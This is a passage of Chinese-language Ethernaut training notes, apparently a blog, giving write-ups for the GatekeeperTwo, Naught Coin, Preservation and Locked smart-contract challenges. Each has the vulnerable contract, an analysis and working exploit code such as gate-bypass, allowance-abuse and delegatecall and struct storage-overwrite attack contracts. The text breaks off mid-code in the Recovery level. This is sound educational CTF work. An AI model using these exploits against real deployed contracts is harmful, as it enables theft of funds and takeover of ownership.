<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address param)&#123;</span><br><span class="line">        GatekeeperTwo a =GatekeeperTwo(param);</span><br><span class="line">        bytes8 _gateKey = bytes8((uint64(0) -1) ^ uint64(keccak256(this)));</span><br><span class="line">        a.enter(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-13"><a href="#攻击流程-13" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>首先，获取一个实例，之后获取合约地址：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324092008121.png" alt="image-20240324092008121"><br>之后在remix中编译部署攻击合约：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324092206882.png" alt="image-20240324092206882"></p>
<p>之后查看entrant的值：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324092228613.png" alt="image-20240324092228613">之后点击“submit instance”来提交示例：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324092305252.png" alt="image-20240324092305252"></p>
<h3 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h3><h5 id="闯关要求-11"><a href="#闯关要求-11" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>NaughtCoin是一个ERC20代币，你已经拥有了所有的代币。但是你只能在10年的后才能将他们转移。你需要想出办法把它们送到另一个地址，这样你就可以把它们自由地转移吗，让后通过将token余额置为0来完成此级别。</p>
<h5 id="合约代码-14"><a href="#合约代码-14" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h5 id="合约分析-14"><a href="#合约分析-14" class="headerlink" title="合约分析"></a>合约分析</h5><p>从以上代码我们可以看出合约NaughtCoin继承了ERC20但是没有对父合约做重写，导致利用父合约的函数可以进行及时转账。而子合约NaughtCoin也没有什么问题，那我们还是回过头来看看import的父合约 ERC20.sol。<br>其实根据 ERC20 的标准我们也知道，转账有两个函数，一个transfer一个transferFrom，题目中代码只重写了transfer函数，那么重写transferFrom就是一个可利用的点了。直接看看ERC20.sol代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address account) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _balances[account];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _approve(owner, spender, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处可以直接调用这个transferFrom了。但是transferFrom有一步权限验证，要验证这个msg.sender是否被_from（实际上在这里的情景的就是自己是否给自己授权了），那么我们同时还可以调用approve 给自己授权。 攻击代码如下：<br>根据以上分析，我们可以构造如下EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">await contract.approve(player,toWei(&quot;1000000&quot;))</span><br><span class="line">await contract.transferFrom(player,contract.address,toWei(&quot;1000000&quot;))</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程solidity"><a href="#攻击流程solidity" class="headerlink" title="攻击流程solidity"></a>攻击流程solidity</h5><p>点击“Get new instance”来获取一个实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324094924421.png" alt="image-20240324094924421"></p>
<p>之后查看当前账户余额</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324094948586.png" alt="image-20240324094948586"></p>
<p>之后使用approve进行授权</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324095007192.png" alt="image-20240324095007192">然后再通过transferFrom来实施转账</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324095020209.png" alt="image-20240324095020209"></p>
<p>之后查看账户余额：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324095030012.png" alt="image-20240324095030012"></p>
<p>最后点击“submit instance”来提交该实例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240324095046708.png" alt="image-20240324095046708"></p>
<h3 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h3><h5 id="闯关条件-3"><a href="#闯关条件-3" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>该合约利用库合约保存 2 个不同时区的时间戳。合约的构造函数输入两个库合约地址用于保存不同时区的时间戳。</p>
<p>通关条件：尝试取得合约的所有权（<code>owner</code>）。</p>
<p>可能有帮助的注意点：</p>
<ol>
<li>深入了解 <code>Solidity</code> 官网文档中底层方法 <code>delegatecall</code> 的工作原理，它如何在链上和库合约中的使用该方法，以及执行的上下文范围。</li>
<li>理解 <code>delegatecall</code> 的上下文保留的含义</li>
<li>理解合约中的变量是如何存储和访问的</li>
<li>理解不同类型之间的如何转换</li>
</ol>
<h5 id="合约代码-15"><a href="#合约代码-15" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-15"><a href="#合约分析-15" class="headerlink" title="合约分析"></a>合约分析</h5><p>以上合约中用到了delegatecall()函数，一般情况下delegatecall用来调用其他合约、库的函数，比如 a 合约中调用 b 合约的函数，执行该函数使用的 storage便是a的。举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    uint public x1;</span><br><span class="line">    uint public x2;</span><br><span class="line"></span><br><span class="line">    function funca(address param)&#123;</span><br><span class="line">        param.delegatecall(bytes4(keccak256(&quot;funcb()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">    uint public y1;</span><br><span class="line">    uint public y2;</span><br><span class="line"></span><br><span class="line">    function funcb()&#123;</span><br><span class="line">        y1=1;</span><br><span class="line">        y2=2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述合约中，一旦在a中调用了b的funcb函数，那么对应的a中 x1就会等于y1，x2就会等于 2。 在这个过程中实际b合约的funcb函数把storage里面的slot 1的值更换为了1，把slot 2的值更换为了 2，那么由于delegatecall的原因这里修改的是a的storage，对应就是修改了 x1，x2。</p>
<p>那么这个题就很好办了，我们调用Preservation的setFirstTime函数时候实际通过delegatecall 执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。 这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了。</p>
<p>由此，我们可构建一下EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationPoc &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line"></span><br><span class="line">  function setTime(uint  _time) public &#123;</span><br><span class="line">    owner = address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-14"><a href="#攻击流程-14" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>点击“Get new instance”获取一个实例</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325102507743.png" alt="image-20240325102507743"></p>
<p>之后在remix中部署恶意智能合约：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325102543670.png" alt="image-20240325102543670"></p>
<p>之后在控制台执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">await contract.setSecondTime(恶意合约地址)</span><br><span class="line">await contract.setFirstTime(player地址)</span><br></pre></td></tr></table></figure>

<p>之后我们就成为了合约的拥有者</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325102604889.png" alt="image-20240325102604889"></p>
<p>最后点击“submit instance”来提交示例即可：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325102705725.png" alt="image-20240325102705725"></p>
<h3 id="locked"><a href="#locked" class="headerlink" title="locked"></a>locked</h3><h5 id="闯关条件-4"><a href="#闯关条件-4" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>此名称注册器已锁定，将不接受任何注册的新名称。而玩家的目标是解锁此注册器。</p>
<h5 id="合约代码-16"><a href="#合约代码-16" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23; </span><br><span class="line"></span><br><span class="line">// A Locked Name Registrar</span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = false;  // registrar locked, no name updates</span><br><span class="line"></span><br><span class="line">    struct NameRecord &#123; // map hashes to addresses</span><br><span class="line">        bytes32 name; // </span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names </span><br><span class="line">    mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses</span><br><span class="line"></span><br><span class="line">    function register(bytes32 _name, address _mappedAddress) public &#123;</span><br><span class="line">        // set up the new NameRecord</span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); // only allow registrations if contract is unlocked</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-16"><a href="#合约分析-16" class="headerlink" title="合约分析"></a>合约分析</h5><p>通过查看以上代码我们可以发现“unlocked”从一开始就被设置为“false”而之后合约中再没有出现过”unlocked”，那么我们如何来改变”unlocked”的值呢？关于这一个我在之前的智能合约审计系列3中讲过一个“变量覆盖”的专题，里面有相关的描述，这里不再赘述了，总体来说这里的漏洞出现在结构体的重定义导致变量覆盖问题。</p>
<p>在该合约中，下面的三行diam重新定义了结构体，因此会覆盖第一个、第二个存储块，因为我们只需要见_name设置为bytes32(1)就可以将unlocked变为“ture”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NameRecord newRecord;</span><br><span class="line">newRecord.name = _name;</span><br><span class="line">newRecord.mappedAddress = _mappedAddress;</span><br></pre></td></tr></table></figure>

<p>EXP如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23; </span><br><span class="line"></span><br><span class="line">// A Locked Name Registrar</span><br><span class="line">contract Locked &#123;</span><br><span class="line"></span><br><span class="line">    bool public unlocked = false;  // registrar locked, no name updates</span><br><span class="line"></span><br><span class="line">    struct NameRecord &#123; // map hashes to addresses</span><br><span class="line">        bytes32 name; // </span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names </span><br><span class="line">    mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses</span><br><span class="line"></span><br><span class="line">    function register(bytes32 _name, address _mappedAddress) public &#123;</span><br><span class="line">        // set up the new NameRecord</span><br><span class="line">        NameRecord newRecord;</span><br><span class="line">        newRecord.name = _name;</span><br><span class="line">        newRecord.mappedAddress = _mappedAddress; </span><br><span class="line"></span><br><span class="line">        resolve[_name] = _mappedAddress;</span><br><span class="line">        registeredNameRecord[msg.sender] = newRecord; </span><br><span class="line"></span><br><span class="line">        require(unlocked); // only allow registrations if contract is unlocked</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    function hack(address param)&#123;</span><br><span class="line">        Locked a = locked(param);</span><br><span class="line">        a.register(bytes32(1),address(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-15"><a href="#攻击流程-15" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个新的示例<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160236-359bb476-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160236-359bb476-44c9-1.png" alt="img"></a><br>之后获取合约地址<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160258-425c657a-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160258-425c657a-44c9-1.png" alt="img"></a><br>之后部署攻击合约：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160318-4eaf111a-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160318-4eaf111a-44c9-1.png" alt="img"></a><br>之后见合约的address作为产生传入hack中实施攻击：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160510-91878120-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160510-91878120-44c9-1.png" alt="img"></a><br>之后再次查看合约的”unlocked”的状态值，发现已经发生了变化，改为了”true”<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160550-a91b5d98-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160550-a91b5d98-44c9-1.png" alt="img"></a><br>最后提交示例即可：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160614-b76263ce-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160614-b76263ce-44c9-1.png" alt="img"></a><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200201160632-c204ae36-44c9-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200201160632-c204ae36-44c9-1.png" alt="img"></a></p>
<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><h5 id="闯关条件-5"><a href="#闯关条件-5" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 <code>0.001</code> 以太币以获得更多代币。 后边他们丢失了合约地址。</p>
<p>如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。</p>
<h5 id="合约代码-17"><a href="#合约代码-17" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span 